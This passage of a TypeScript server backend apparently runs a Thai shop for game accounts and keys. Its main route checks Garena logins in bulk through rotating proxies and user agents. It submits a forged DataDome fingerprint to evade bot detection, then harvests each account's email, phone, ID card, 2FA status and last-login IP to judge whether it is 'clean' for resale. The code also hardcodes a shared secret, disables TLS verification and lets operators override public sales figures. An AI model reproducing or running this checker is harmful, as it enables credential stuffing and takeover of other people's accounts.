        if (apiKeyDoc.exists) {
          const data = apiKeyDoc.data();
          if (data?.status === 'active') {
            if (data?.expires_at && new Date(data.expires_at) < new Date()) {
               await admin.firestore().collection('api_keys').doc(apiKey).update({ status: 'expired' }).catch(() => {});
               return res.status(401).json({ error: 'API Key has expired' });
            }
            isApiKeyValid = true;
            // Fire and forget updating last_used
            admin.firestore().collection('api_keys').doc(apiKey).update({ last_used: new Date().toISOString() }).catch(() => {});
          } else {
             return res.status(401).json({ error: 'API Key is disabled or expired' });
          }
        } else {
          return res.status(401).json({ error: 'Invalid API Key' });
        }
      } catch (err) {
        console.error('Error verifying API Key:', err);
        return res.status(500).json({ error: 'Error verifying API Key' });
      }
    }

    if (!isApiKeyValid) {
      // Verify Turnstile Token
      if (!turnstileToken) {
         return res.status(403).json({ error: 'Missing Captcha token. Please refresh the page and verify you are human. (Or provide valid API Key)' });
      }

      // Since a batch check loop uses the same token, we cache verified tokens for 5 minutes
      const now = Date.now();
      const cachedTime = turnstileCache.get(turnstileToken);
      
      if (cachedTime && (now - cachedTime < 5 * 60 * 1000)) {
         // Token is already verified and within 5 minute window
         // console.log("Used cached Turnstile token bypass");
      } else {
         const secretKey = process.env.TURNSTILE_SECRET_KEY || '';
         
         if (!secretKey) {
             turnstileCache.set(turnstileToken, now);
         } else {
             try {
               const params = new URLSearchParams();
               params.append('secret', secretKey);
               params.append('response', turnstileToken);
  
           const turnstileResponse = await axios.post(
             'https://challenges.cloudflare.com/turnstile/v0/siteverify',
             params,
             {
               headers: {
                 'Content-Type': 'application/x-www-form-urlencoded'
               }
             }
           );
  
           if (!turnstileResponse.data.success) {
             console.error('Turnstile verification failed:', turnstileResponse.data);
             return res.status(403).json({ error: 'Turnstile verification failed. Please refresh the page and try again.' });
           }
  
           // Cache the successfully verified token
           turnstileCache.set(turnstileToken, now);
           
           // Clean up old entries from cache every once in a while
           if (turnstileCache.size > 1000) {
             for (const [key, time] of turnstileCache.entries()) {
               if (now - time > 5 * 60 * 1000) {
                 turnstileCache.delete(key);
               }
             }
           }
         } catch (error) {
           console.error('Error verifying Turnstile token:', error);
           return res.status(500).json({ error: 'Internal server error during captcha verification.' });
         }
         }
      }
    }

    const jar = new CookieJar();
    
    // User-Agent Pool for basic rotation
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    ];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const isEdge = randomUserAgent.includes('Edg/');
    const isMac = randomUserAgent.includes('Mac OS');
    const chromeVer = randomUserAgent.match(/Chrome\/(\d+)\./)?.[1] || '130';
    
    let secChUa = isEdge 
      ? `"Chromium";v="${chromeVer}", "Microsoft Edge";v="${chromeVer}", "Not?A_Brand";v="99"`
      : `"Chromium";v="${chromeVer}", "Google Chrome";v="${chromeVer}", "Not?A_Brand";v="99"`;
    let secChPlatform = isMac ? '"macOS"' : '"Windows"';

    // Webshare Proxy provided by user
    // Wait for proxies if empty (in case it's starting)
    if (freeProxies.length === 0) {
      await fetchFreeProxies();
    }

    let proxyUrl = '';
    if (siteSettings.proxies && Array.isArray(siteSettings.proxies) && siteSettings.proxies.length > 0) {
      proxyUrl = siteSettings.proxies[Math.floor(Math.random() * siteSettings.proxies.length)];
    } else if (freeProxies.length > 0) {
      proxyUrl = freeProxies[Math.floor(Math.random() * freeProxies.length)];
    }
    
    let agent;
    try {
      if (proxyUrl) {
        // 10s timeout so the proxy fails BEFORE the platform (Cloud Run/Nginx) limit
        agent = new HttpsProxyAgent(proxyUrl, { timeout: 10000, rejectUnauthorized: false } as any);
      } else {
        agent = new https.Agent({ rejectUnauthorized: false });
      }
    } catch (err) {
      console.error('Failed to initialize proxy agent:', err);
      agent = new https.Agent({ rejectUnauthorized: false });
    }

    
    const controller = new AbortController();
    // 10s hard limit for the whole route to ensure we respond with JSON before platform drop
    const timeoutId = setTimeout(() => controller.abort(), 10000); 

    
    // Make sure we clear the timeout when the request closes or route returns
    res.on('finish', () => clearTimeout(timeoutId));
    res.on('close', () => clearTimeout(timeoutId));

    const axiosConfig: any = { 
      headers: {
        'User-Agent': randomUserAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': 'https://sso.garena.com/'
      },
      httpsAgent: agent,
      httpAgent: agent,
      proxy: false,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: (status: number) => status < 500
    };
    const client = axios.create(axiosConfig);

    // Manual Cookie Management to avoid HttpsProxyAgent conflict with axios-cookiejar-support
    client.interceptors.request.use(async (config) => {
      try {
        const url = config.url || '';
        const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
        if (cookie) {
          if (config.headers && typeof config.headers.set === 'function') {
            try {
              config.headers.set('Cookie', cookie);
            } catch (ignore) {}
          } else if (config.headers) {
            try {
              (config.headers as any)['Cookie'] = cookie;
            } catch (ignore) {}
          }
        }
      } catch (e) {
        console.error("Cookie request interceptor error:", e);
      }
      return config;
    }, (error) => Promise.reject(error));

    client.interceptors.response.use(async (response) => {
      try {
        const setCookies = response.headers['set-cookie'];
        if (setCookies) {
          const url = response.config.url || '';
          const targetUrl = url.startsWith('http') ? url : (response.config.baseURL || '') + url;
          for (const cookieStr of setCookies) {
            await jar.setCookie(cookieStr, targetUrl);
          }
        }
      } catch (e) {
        console.error("Cookie response interceptor error:", e);
      }
      return response;
    }, (error) => Promise.reject(error));

    try {
      // 1. Precise DataDome Handshake with updated fingerprint
      const ddPayloadObj = {
        "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
        "ua": randomUserAgent,
        "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
        "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
        "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
        "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
        "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true, "plgre": true,
        "plgof": false, "plggt": false, "pltod": false, "hcovdr": false, "hcovdr2": false,
        "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false, "lb": false,
        "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false, "vnd": "Google Inc.",
        "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
        "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined", "aco": "probably",
        "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably", "acwts": false,
        "acma": "maybe", "acmats": false, "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false,
        "acmp4": "maybe", "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe",
        "acwmts": false, "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
        "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "", "vcmpts": false,
        "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true, "dvm": 8, "sqt": false,
        "so": "landscape-primary", "bda": false, "wdw": true, "prm": true, "tzp": true, "cvs": true,
        "usb": true, "cap": true, "tbf": false, "lgs": true, "tpd": true
      };
      
      const payloadParams = new URLSearchParams();
      payloadParams.append('jsData', JSON.stringify(ddPayloadObj));
      payloadParams.append('eventCounters', '[]');
      payloadParams.append('jsType', 'ch');
      payloadParams.append('cid', 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae');
      payloadParams.append('ddk', 'AE3F04AD3F0D3A462481A337485081');
      payloadParams.append('Referer', 'https://account.garena.com/');
      payloadParams.append('request', '/');
      payloadParams.append('responsePage', 'origin');
      payloadParams.append('ddv', '4.35.4');
      
      const ddPayload = payloadParams.toString();

      console.log('--- Calling DataDome ---');
      const ddRes = await client.post('https://dd.garena.com/js/', ddPayload, {
        headers: { 
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://account.garena.com',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': randomUserAgent
        }
      });
      console.log('--- DataDome Done ---');

      if (ddRes.data && ddRes.data.cookie) {
        const ddCookieParts = ddRes.data.cookie.split(';');
        const ddCookieValue = ddCookieParts[0];
        await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
      }

      // Small delay to simulate human-like transition
      await new Promise(r => setTimeout(r, 800 + Math.random() * 500));

      let usedDirectClient = false;
      let directClient;
      let preloginRes;

      if (ddRes.status === 403) {
        console.log('--- DataDome Proxy 403. Skipping proxy Prelogin. ---');
        preloginRes = { status: 403 };
      } else {
        // 2. Prelogin Challenge with enhanced headers
        console.log('--- Calling Prelogin ---');
        preloginRes = await client.get('https://sso.garena.com/api/prelogin', {
          params: { app_id: '10100', account, format: 'json', id: Date.now() },
          headers: {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
          }
        });
        console.log('--- Prelogin Done ---');
      }

      if (preloginRes.status === 403) {
        console.log('--- Proxy 403. Trying DIRECT connection (No Proxy) ---');
        // Fallback to Server IP
        usedDirectClient = true;
        const directAgent = new https.Agent({ rejectUnauthorized: false });
        directClient = axios.create({ ...axiosConfig, httpsAgent: directAgent, httpAgent: directAgent });
        
        // Attach same cookie jar logic
        directClient.interceptors.request.use(async (config) => {
          try {
            const url = config.url || '';
            const cookie = await jar.getCookieString(url.startsWith('http') ? url : (config.baseURL || '') + url);
            if (cookie) {
              if (config.headers && typeof config.headers.set === 'function') config.headers.set('Cookie', cookie);
              else if (config.headers) (config.headers as any)['Cookie'] = cookie;
            }
          } catch (e) {}
          return config;
        }, (e) => Promise.reject(e));

        directClient.interceptors.response.use(async (response) => {
          try {
            const setCookies = response.headers['set-cookie'];
            if (setCookies) {
              const targetUrl = response.config.url?.startsWith('http') ? response.config.url : (response.config.baseURL || '') + (response.config.url || '');
              for (const cookieStr of setCookies) await jar.setCookie(cookieStr, targetUrl);
            }
          } catch (e) {}
          return response;
        }, (e) => Promise.reject(e));

        jar.removeAllCookiesSync();

        console.log('--- Calling DataDome (Direct) ---');
        const fallbackDdRes = await directClient.post('https://dd.garena.com/js/', ddPayload, {
          headers: { 
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://account.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': randomUserAgent
          }
        });

        if (fallbackDdRes.data && fallbackDdRes.data.cookie) {
          const ddCookieParts = fallbackDdRes.data.cookie.split(';');
          const ddCookieValue = ddCookieParts[0];
          await jar.setCookie(ddCookieValue, 'https://sso.garena.com');
        }

        preloginRes = await directClient.get('https://sso.garena.com/api/prelogin', {
          params: { app_id: '10100', account, format: 'json', id: Date.now() },
          headers: {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'connection': 'keep-alive',
            'host': 'sso.garena.com',
            'referer': 'https://account.garena.com/',
            'sec-ch-ua': secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': secChPlatform,
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': randomUserAgent
          }
        });
        
        if (preloginRes.status === 403) {
           return res.json({ success: false, error: 'ระบบ Garena ป้องกันการเข้าถึงบัญชี (403) แนะนำให้เปลี่ยน Proxy หรือหยุดพัก' });
        }
      }

      const { v1, v2, error: preError } = preloginRes.data;
      if (preError) return res.json({ success: false, error: `Account Error: ${preError}` });
      if (!v1 || !v2) {
        console.error("Prelogin Debug Data:", JSON.stringify(preloginRes.data));
        if (preloginRes.data && (preloginRes.data.captcha || (preloginRes.data.url && preloginRes.data.url.includes('captcha')))) {
          return res.json({ success: false, error: 'ระบบตรวจพบโปรแกรมอัตโนมัติ (DataDome / Captcha). กรุณาเปลี่ยน Proxy' });
        }
        return res.json({ success: false, error: 'Challenge failed (Empty v1/v2). Garena structure might have changed.' });
      }

      // 3. SSO Login Attempt
      console.log('--- Calling SSO Login ---');
      const hashedPassword = encryptPassword(password, v1, v2);
      const activeClient = usedDirectClient ? directClient : client;
      
      const loginRes = await activeClient.get('https://sso.garena.com/api/login', {
        params: {
          app_id: '10100', account, password: hashedPassword,
          redirect_uri: 'https://account.garena.com/',
          format: 'json', id: Date.now()
        },
        headers: {
          'accept': 'application/json, text/plain, */*',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'user-agent': randomUserAgent
        }
      });
      console.log('--- Login Done ---');

      const loginData = loginRes.data;
      if (loginData.error) {
        const errorMsg = loginData.error === 'error_auth' ? 'รหัสผ่านผิด' : 
                        loginData.error === 'error_not_exist' ? 'ไม่พบไอดีนี้' : 
                        loginData.error;
        return res.json({ success: false, error: errorMsg });
      }

      // 4. Successful Login - Fetch Info
      console.log('--- Calling Account Init ---');
      const initRes = await activeClient.get('https://account.garena.com/api/account/init', {
        headers: { 
          'accept': '*/*',
          'referer': 'https://account.garena.com/',
          'sec-ch-ua': secChUa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': secChPlatform,
          'user-agent': randomUserAgent
        }
      });
      console.log('--- Account Init Done ---');      
      const resData = initRes.data || {};
      const userData = resData.user_info || resData || {};
      
      const binds = [];
      if (userData.email && userData.email !== 'N/A') binds.push('Email');
      if (userData.mobile_no && userData.mobile_no !== 'N/A') binds.push('Phone');
      if (userData.is_fbconnect_enabled) binds.push('Facebook');
      if (userData.idcard && userData.idcard !== 'N/A') binds.push('ID Card');
      
      const isClean = binds.length === 0;

      // 5. Fetch CODM & Game Info
      const [codmInfo, gameConnections] = await Promise.all([
        getCodmInfo(activeClient),
        getGameConnections(activeClient)
      ]);

      const rovGames = (gameConnections || []).filter((g: string) => g.toUpperCase().includes('ROV'));
      const hasRov = rovGames.length > 0;
      let rovCharacter = 'N/A';
      if (hasRov) {
        try {
          const cleanName = rovGames[0].replace('[', '').replace(']', '');
          const parts = cleanName.split('-');
          if (parts.length > 2) rovCharacter = parts[2].trim();
        } catch(e) {}
      }
      const phoneBound = !!(userData.mobile_no && userData.mobile_no !== 'N/A');
      const emailVerified = !!userData.email_v;
      const rovClean = hasRov && !emailVerified && !phoneBound;
      const hasCodm = codmInfo != null && codmInfo.level !== 'Unknown';

      return res.json({
        success: true,
        data: {
          account, password, uid: userData.uid || 'N/A',
          shells: userData.shell || 0,
          level: codmInfo?.level || 0, 
          rank: 'Success', 
          isClean,
          phoneBound,
          emailVerified,
          fbLinked: !!userData.is_fbconnect_enabled,
          region: userData.acc_country || 'TH',
          otherGames: gameConnections || [],
          codmNickname: codmInfo?.nickname || 'N/A',
          codmUid: codmInfo?.uid || 'N/A',
          codmOpenId: codmInfo?.open_id || 'N/A',
          codmTOpenId: codmInfo?.t_open_id || 'N/A',
          codmRegion: codmInfo?.region || 'N/A',
          codmRegionName: codmInfo?.region_name || 'Unknown',
          codmRegionFlag: codmInfo?.region_flag || '🏳️',
          idCardBound: !!(userData.idcard && userData.idcard !== 'N/A'),
          hasRov,
          rovCharacter,
          rovClean,
          hasCodm,
          avatarUrl: userData.avatar || 'N/A',
          mobileNumber: userData.mobile_no || 'N/A',
          emailAddress: userData.email || 'N/A',
          fbUsername: userData.fb_account || 'N/A',
          twoFaEnabled: !!userData.two_step_verify_enable,
          authenticatorEnabled: !!userData.authenticator_enable,
          lastLoginDate: resData.login_history?.[0]?.timestamp ? new Date(resData.login_history[0].timestamp * 1000).toLocaleString('th-TH') : 'N/A',
          lastLoginIp: resData.login_history?.[0]?.ip || 'N/A',
          lastLoginCountry: resData.login_history?.[0]?.country || 'N/A',
          lastLoginSource: resData.login_history?.[0]?.source || 'Unknown'
        }
      });

    } catch (err: any) {
      const errMsg = err?.message || '';
      if (!['ECONNREFUSED', 'canceled', 'CanceledError', 'AbortError'].some(e => errMsg.includes(e) || err?.name === e || err?.code === e)) {
         console.error("Garena API Error:", errMsg || err);
      }
      let errorMsg = 'Network Error: ' + (errMsg || 'Unknown Error');
      
      if (err?.code === 'ECONNABORTED' || errMsg.includes('timeout') || err?.code === 'ETIMEDOUT') {
        errorMsg = 'การเชื่อมต่อหมดเวลา (Timeout). อาจเกิดจาก Proxy ช้าหรือใช้งานไม่ได้ (ภายใน 30 วินาที)';
      } else if (err?.name === 'AbortError' || err?.code === 'ERR_CANCELED' || err?.name === 'CanceledError' || errMsg === 'canceled') {
        errorMsg = 'การเชื่อมต่อถูกยกเลิก (ใช้เวลาเกิน 90 วินาที). Proxy ช้าเกินไป หรือค้าง';
      } else if (err?.code === 'ECONNRESET') {
        errorMsg = 'การเชื่อมต่อถูกตัด (ECONNRESET). โปรดเปลี่ยน Proxy หรือลองใหม่อีกครั้ง';
      } else if (errMsg.includes('disconnected') || errMsg.includes('TLS')) {
        errorMsg = 'ไม่สามารถสร้างการเชื่อมต่อที่ปลอดภัย (TLS Error). Proxy นี้อาจไม่รองรับ HTTPS หรือถูกบล็อก';
      } else if (err?.code === 'ECONNREFUSED' || errMsg.includes('ECONNREFUSED')) {
        errorMsg = 'เชื่อมต่อล้มเหลว (ECONNREFUSED). เซิร์ฟเวอร์ Proxy ออฟไลน์หรือไม่สามารถติดต่อได้';
      } else if (errMsg.includes('CONNECT response')) {
        errorMsg = 'การเชื่อมต่อถูกตัดตอนเชื่อมต่อกับ Proxy (Proxy connection ended). กรุณาลองทดสอบอีกครั้ง หรือเปลี่ยน Proxy';
      }
      
      return res.json({ success: false, error: errorMsg, isProxyError: true });
    }
  });

  // --- Supabase Proxy Routes ---
  // --- Products Endpoints ---

  const firestoreCache: Record<string, { data: any, timestamp: number }> = {};
  const getCachedCollection = async (collectionName: string, ttl: number = 20000) => {
    const now = Date.now();
    if (firestoreCache[collectionName] && now - firestoreCache[collectionName].timestamp < ttl) {
      return firestoreCache[collectionName].data;
    }
    const snapshot = await admin.firestore().collection(collectionName).get();
    const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
    firestoreCache[collectionName] = { data, timestamp: now };
    return data;
  };
  
  const invalidateCache = (collectionName: string) => {
    delete firestoreCache[collectionName];
  };

  app.get('/api/products', async (req: any, res: any) => {
    try {
      const data = await getCachedCollection('products');
      const processedData = data.map((item: any) => {
        if (!req.isAdmin) {
          const { stockData, ...publicItem } = item;
          return publicItem;
        }
        return item;
      });
      res.json(processedData);
    } catch (err: any) {
      console.error('PROD ERR OBJ:', JSON.stringify(err, Object.getOwnPropertyNames(err)));
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/products', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const product = req.body;
      const { id, ...dataToSaveRaw } = product;
      // Deep strip undefined values to please Firestore
      const dataToSave = JSON.parse(JSON.stringify(dataToSaveRaw));
      const docRef = await admin.firestore().collection('products').add(dataToSave);
      invalidateCache('products');
      invalidateStatsCache();
      res.json({ id: docRef.id, dbId: docRef.id, ...dataToSave });
    } catch (err: any) {
      console.error('Internal server error creating product:', JSON.stringify(err, Object.getOwnPropertyNames(err)));
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.put('/api/products/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const product = req.body;
      const { id, ...dataToSaveRaw } = product;
      const dataToSave = JSON.parse(JSON.stringify(dataToSaveRaw));
      const docRef = admin.firestore().collection('products').doc(req.params.id);
      await docRef.update(dataToSave);
      invalidateCache('products');
      invalidateStatsCache();
      res.json({ id: req.params.id, ...dataToSave });
    } catch (err) {
      console.error('Internal server error updating product:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.delete('/api/products/:id', requireAdmin, async (req, res) => {
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      await admin.firestore().collection('products').doc(req.params.id).delete();
      invalidateCache('products');
      invalidateStatsCache();
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting product:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.get('/api/test_stats', async (req, res) => {
    res.json({ ok: 1 });
  });

  app.get('/api/stats', async (req, res) => {
console.log('HIT STATS ENDPOINT');
    try {
      const now = Date.now();
      if (cachedStats && now - lastStatsFetch < 600000) {
        return res.json(cachedStats);
      }

      const adminDb = admin.firestore();
      
      let totalStock = 0;
      try {
        const productsSnap = await adminDb.collection('products').get();
        productsSnap.forEach(doc => {
          const data = doc.data();
          if (data.stock > 0 && data.stock < 999999) totalStock += data.stock;
        });
      } catch (e) {
      }

      let totalSales = 0;
      let totalPurchaseOrders = 0;
      try {
        const purchasesSnap = await adminDb.collection('purchases').get();
        purchasesSnap.forEach(doc => {
          totalSales += (doc.data().price || 0);
          totalPurchaseOrders++;
        });
      } catch(e) {
      }

      let totalTopupsAmount = 0;
      try {
        const topupsSnap = await adminDb.collection('topups').get();
        topupsSnap.forEach(doc => {
          totalTopupsAmount += (doc.data().amount || 0);
        });
      } catch(e) {
      }

      let totalUsersCount = 0;
      try {
        const usersSnap = await adminDb.collection('users').get();
        totalUsersCount = usersSnap.docs.length;
      } catch(e) {
      }

      cachedStats = {
        users: siteSettings.stats_users_override !== undefined && siteSettings.stats_users_override !== null && !isNaN(siteSettings.stats_users_override) ? siteSettings.stats_users_override : totalUsersCount + (siteSettings.stats_users_offset || 0),
        sales: siteSettings.stats_sales_override !== undefined && siteSettings.stats_sales_override !== null && !isNaN(siteSettings.stats_sales_override) ? siteSettings.stats_sales_override : totalSales + (siteSettings.stats_sales_offset || 0),
        stock: siteSettings.stats_stock_override !== undefined && siteSettings.stats_stock_override !== null && !isNaN(siteSettings.stats_stock_override) ? siteSettings.stats_stock_override : totalStock,
        totalOrders: totalPurchaseOrders,
        totalTopupsAmount
      };
      
      if (totalUsersCount > 0 || totalPurchaseOrders > 0 || totalStock > 0 || totalTopupsAmount > 0) {
         lastStatsFetch = now;
      }
      
      res.json(cachedStats);
    } catch (err: any) {
      console.error('STATS ERROR:', err);
      // Fallback
      res.json(cachedStats || {
        users: siteSettings.stats_users_offset || 0,
        sales: siteSettings.stats_sales_offset || 0,
        stock: 0,
        totalOrders: 0,
        totalTopupsAmount: 0
      });
    }
  });

  // --- Purchases Endpoints ---
  app.get('/api/purchases', async (req: any, res: any) => {
    try {
      const adminDb = admin.firestore();
      let q: any = adminDb.collection('purchases');
      if (req.isAdmin) {
        q = q.orderBy('date', 'desc').limit(100);
      } else if (req.user) {
        q = q.where('userId', '==', req.user.uid).orderBy('date', 'desc').limit(100);
      } else {
        return res.json([]);
      }
      const snapshot = await q.get();
      const data = snapshot.docs.map(doc => ({ dbId: doc.id, ...doc.data() }));
      res.json(data);
    } catch (err: any) {
      console.error('Internal server error fetching purchases:', err.message || err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  app.post('/api/purchases', async (req, res) => {
    // Legacy endpoint, we can leave it to avoid breaking changes, or just require admin.
    if (!admin.firestore()) return res.status(500).json({ error: 'DB not connected' });
    try {
      const data = req.body;
      const docRef = await admin.firestore().collection('purchases').add(data);
      res.json({ id: docRef.id, dbId: docRef.id, ...data });
    } catch (err) {
      console.error('Internal server error creating purchase:', err);
      res.status(500).json({ error: String(err && err.message ? err.message : err) });
    }
  });

  // Mutex for purchase locking
  const purchaseLocks: Record<string, Promise<any>> = {};

  app.post('/api/discord-rekey', async (req: any, res: any) => {
    const { key, secret, plan } = req.body;
    if (secret !== 'MY_SECRET_DISCORD_TOKEN_1234') {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
      const newDoc = { key, plan: plan || 'premium', status: 'active', created_at: new Date().toISOString() };
      await admin.firestore().collection('license_keys').add(newDoc);
      res.json({ success: true, message: `เพิ่มคีย์ ${key} สำเร็จ!`, plan: newDoc.plan });
    } catch (error) {
      res.status(500).json({ error: 'Internal server error while adding key' });
    }
  });

  app.post('/api/discord-redeem', async (req: any, res: any) => {
    const { key, secret } = req.body;
    // ตั้งค่ารหัสลับให้ตรงกันระหว่างเว็บกับบอท
    if (secret !== 'MY_SECRET_DISCORD_TOKEN_1234') {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    if (!key) {
      return res.status(400).json({ error: 'กรุณาระบุคีย์' });
    }

    try {
      // 1. ลองหา key ใน license_keys
      const licenseSnapshot = await admin.firestore().collection('license_keys').where('key', '==', key).where('status', '==', 'active').get();
      if (!licenseSnapshot.empty) {
        const docId = licenseSnapshot.docs[0].id;
        const docRef = admin.firestore().collection('license_keys').doc(docId);
        await docRef.update({ status: 'used' });
        // บันทึกประวัติ
        await admin.firestore().collection('used_keys').add({
            key,
            used_by_discord: true,
            used_at: new Date().toISOString()
        });
        return res.json({ success: true, message: 'รับยศสำเร็จ!' });
      }

      // 2. ถ้าไม่เจอ ลองหาในประวัติการสั่งซื้อ (purchases)
      const purchasesRef = admin.firestore().collection('purchases');
      const snapshot = await purchasesRef.get();
      
      let foundDoc = null;
      for (const doc of snapshot.docs) {
        const data = doc.data();
        if (data.secretData) {
          const keysInPurchase = data.secretData.split('\n').map((k: string) => k.trim());
          if (keysInPurchase.includes(key.trim())) {
            foundDoc = { id: doc.id, ...data };
            break;
          }
        }
      }

      if (!foundDoc) {
        return res.status(404).json({ error: 'ไม่พบคีย์นี้ในระบบ หรือคีย์ไม่ถูกต้อง' });
      }

      if (foundDoc.discordClaimed) {
        return res.status(400).json({ error: 'คีย์นี้ถูกใช้งานเพื่อรับยศไปแล้ว' });
      }

      // Mark as claimed
      await purchasesRef.doc(foundDoc.id).update({ ...foundDoc, discordClaimed: true });

      res.json({ success: true, message: 'รับยศสำเร็จ!' });
    } catch (e: any) {
      console.error(e);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/buy', requireAuth, async (req: any, res: any) => {
    const { productId, quantity } = req.body;
    if (!productId || typeof quantity !== 'number' || quantity < 1) {
      return res.status(400).json({ error: 'Invalid product or quantity' });
    }

    const userId = req.user.uid;
    const lockKey = userId + '_' + productId;
    
    // Acquire lock
    while (purchaseLocks[lockKey]) {
      await purchaseLocks[lockKey];
    }
    
    let releaseLock: () => void;
    purchaseLocks[lockKey] = new Promise(resolve => { releaseLock = resolve as any; });

    try {
      const userRef = admin.firestore().collection('users').doc(userId);
      const productRef = admin.firestore().collection('products').doc(productId);

      console.log('buy request for user', userId, 'product', productId);

      const [userDoc, productDoc] = await Promise.all([userRef.get(), productRef.get()]);

      if (!userDoc.exists) {
         console.log('User not found in db:', userId);
         releaseLock!();
         delete purchaseLocks[lockKey];
         return res.status(404).json({ error: 'User not found' });
      }
      if (!productDoc.exists) {
        releaseLock!();
        delete purchaseLocks[lockKey];
        return res.status(404).json({ error: 'Product not found' });
      }

      const userData = userDoc.data() || {};
      const productData = productDoc.data() || {};

      const price = Number(productData.price) || 0;
      const totalCost = price * quantity;

      if ((Number(userData.balance) || 0) < totalCost) {
        releaseLock!();
        delete purchaseLocks[lockKey];
        return res.status(400).json({ error: 'ยอดเงินไม่เพียงพอ' });
      }

      const availableStock = Array.isArray(productData.stockData) ? productData.stockData.length : 0;
      if (availableStock < quantity) {
        releaseLock!();
        delete purchaseLocks[lockKey];
        return res.status(400).json({ error: 'สินค้าในสต๊อกไม่เพียงพอ' });
      }

      // Claim items
      const currentStockData = [...productData.stockData];
      const claimedItems: string[] = [];
      for (let i = 0; i < quantity; i++) {
        claimedItems.push(currentStockData.shift() as string);
      }

      const newBalance = (Number(userData.balance) || 0) - totalCost;

      const newHistoryItem = {
        id: Math.random().toString(36).substring(7),
        userId: userId,
